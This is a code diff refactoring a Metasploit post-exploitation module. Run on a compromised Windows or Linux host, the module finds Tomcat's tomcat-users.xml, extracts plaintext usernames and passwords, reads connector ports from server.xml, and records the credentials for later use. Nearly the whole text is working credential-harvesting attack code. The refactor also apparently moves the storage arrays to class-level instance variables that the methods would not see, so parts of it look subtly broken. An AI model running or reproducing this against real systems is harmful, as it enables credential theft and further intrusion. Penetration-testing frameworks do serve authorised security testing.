@@ -20,18 +20,23 @@ class MetasploitModule < Msf::Post
           'Koen Riepe <koen.riepe@fox-it.com>', # Module author
         ],
         'Platform' => [ 'win', 'linux' ],
-        'SessionTypes' => [ 'meterpreter' ]
+        'SessionTypes' => [ 'meterpreter' ],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [],
+          'Reliability' => []
+        }
       )
     )
   end
 
-  $username = []
-  $password = []
-  $port = []
-  $paths = []
+  @username = []
+  @password = []
+  @port = []
+  @paths = []
 
   def report_creds(user, pass, port)
-    return if (user.empty? || pass.empty?)
+    return if user.blank? || pass.blank?
 
     # Assemble data about the credential objects we will be creating
     credential_data = {
@@ -46,7 +51,7 @@ class MetasploitModule < Msf::Post
 
     credential_core = create_credential(credential_data)
 
-    if !port.is_a? Integer
+    if !port.is_a?(Integer)
       port = 8080
       print_status("Port not an Integer, defaulting to port #{port} for creds database")
     end
@@ -63,67 +68,68 @@ class MetasploitModule < Msf::Post
     create_credential_login(login_data)
   end
 
-  def gatherwin
+  def gather_win
     print_status('Windows OS detected, enumerating services')
-    tomcatHomeArray = []
+    tomcat_home_array = []
     service_list.each do |service|
       if service[:name].downcase.include? 'tomcat'
         print_good('Tomcat service found')
-        tomcatHomeArray.push(service_info(service[:name])[:path].split('\\bin\\')[0])
+        tomcat_home_array.push(service_info(service[:name])[:path].split('\\bin\\')[0])
       end
     end
 
-    if !tomcatHomeArray.empty?
-      tomcatHomeArray.each do |tomcat_home|
-        if tomcat_home.include? '"'
-          tomcat_home = tomcat_home.split('"')[1]
-        end
+    if tomcat_home_array.empty?
+      print_status('No Tomcat home can be determined')
+      return
+    end
 
-        conf_path = "#{tomcat_home}\\conf\\tomcat-users.xml"
+    tomcat_home_array.each do |tomcat_home|
+      if tomcat_home.include? '"'
+        tomcat_home = tomcat_home.split('"')[1]
+      end
 
-        if exist?(conf_path)
-          print_status("#{conf_path} found!")
-          xml = read_file(conf_path).split("\n")
+      conf_path = "#{tomcat_home}\\conf\\tomcat-users.xml"
 
-          comment_block = false
-          xml.each do |line|
-            if line.include?('<user username=') && !comment_block
-              $username.push(line.split('<user username="')[1].split('"')[0])
-              $password.push(line.split('password="')[1].split('"')[0])
-              $paths.push(conf_path)
-            elsif line.include?('<!--')
-              comment_block = true
-            elsif line.include?(('-->')) && comment_block
-              comment_block = false
-            end
-          end
-        end
+      if exist?(conf_path)
+        print_status("#{conf_path} found!")
+        xml = read_file(conf_path).split("\n")
 
-        port_path = "#{tomcat_home}\\conf\\server.xml"
-        if exist?(port_path)
-          xml = read_file(port_path).split("\n")
-        end
         comment_block = false
         xml.each do |line|
-          if line.include?('<Connector') && !comment_block
-            i = 0
-            while i < $username.count
-              $port.push(line.split('<Connector port="')[1].split('"')[0].to_i)
-              i += 1
-            end
+          if line.include?('<user username=') && !comment_block
+            @username.push(line.split('<user username="')[1].split('"')[0])
+            @password.push(line.split('password="')[1].split('"')[0])
+            @paths.push(conf_path)
           elsif line.include?('<!--')
             comment_block = true
-          elsif line.include?(('-->')) && comment_block
+          elsif line.include?('-->') && comment_block
             comment_block = false
           end
         end
       end
-    else
-      print_status('No Tomcat home can be determined')
+
+      port_path = "#{tomcat_home}\\conf\\server.xml"
+      if exist?(port_path)
+        xml = read_file(port_path).split("\n")
+      end
+      comment_block = false
+      xml.each do |line|
+        if line.include?('<Connector') && !comment_block
+          i = 0
+          while i < @username.count
+            @port.push(line.split('<Connector port="')[1].split('"')[0].to_i)
+            i += 1
+          end
+        elsif line.include?('<!--')
+          comment_block = true
+        elsif line.include?('-->') && comment_block
+          comment_block = false
+        end
+      end
     end
   end
 
-  def gathernix
+  def gather_nix
     print_status('Unix OS detected')
     user_files = cmd_exec('locate tomcat-users.xml').split("\n")
     if !user_files.empty?
@@ -136,12 +142,12 @@ class MetasploitModule < Msf::Post
           comment_block = false
           xml.each do |line|
             if line.include?('<user username=') && !comment_block
-              $username.push(line.split('<user username="')[1].split('"')[0])
-              $password.push(line.split('password="')[1].split('"')[0])
-              $paths.push(path)
+              @username.push(line.split('<user username="')[1].split('"')[0])
+              @password.push(line.split('password="')[1].split('"')[0])
+              @paths.push(path)
             elsif line.include?('<!--')
               comment_block = true
-            elsif line.include?(('-->')) && comment_block
+            elsif line.include?('-->') && comment_block
               comment_block = false
             end
           end
@@ -165,13 +171,13 @@ class MetasploitModule < Msf::Post
           xml.each do |line|
             if line.include?('<Connector') && !comment_block
               i = 0
-              while i < $username.count
-                $port.push(line.split('<Connector port="')[1].split('"')[0].to_i)
+              while i < @username.count
+                @port.push(line.split('<Connector port="')[1].split('"')[0].to_i)
                 i += 1
               end
             elsif line.include?('<!--')
               comment_block = true
-            elsif line.include?(('-->')) && comment_block
+            elsif line.include?('-->') && comment_block
               comment_block = false
             end
           end
@@ -186,29 +192,29 @@ class MetasploitModule < Msf::Post
 
   def run
     if sysinfo
-      if sysinfo['OS'].include? 'Windows'
-        gatherwin
+      if sysinfo['OS'].include?('Windows')
+        gather_win
       else
-        gathernix
+        gather_nix
       end
     else
       print_error('Incompatible session type, sysinfo is not available.')
     end
 
-    if $username.empty?
+    if @username.empty?
       print_status('No user credentials have been found')
     end
 
     i = 0
-    while i < $username.count
-      print_good("Username and password found in #{$paths[i]} - #{$username[i]}:#{$password[i]}")
-      report_creds($username[i], $password[i], $port[i])
+    while i < @username.count
+      print_good("Username and password found in #{@paths[i]} - #{@username[i]}:#{@password[i]}")
+      report_creds(@username[i], @password[i], @port[i])
       i += 1
     end
 
-    $username = []
-    $password = []
-    $port = []
-    $paths = []
+    @username = []
+    @password = []
+    @port = []
+    @paths = []
   end
 end
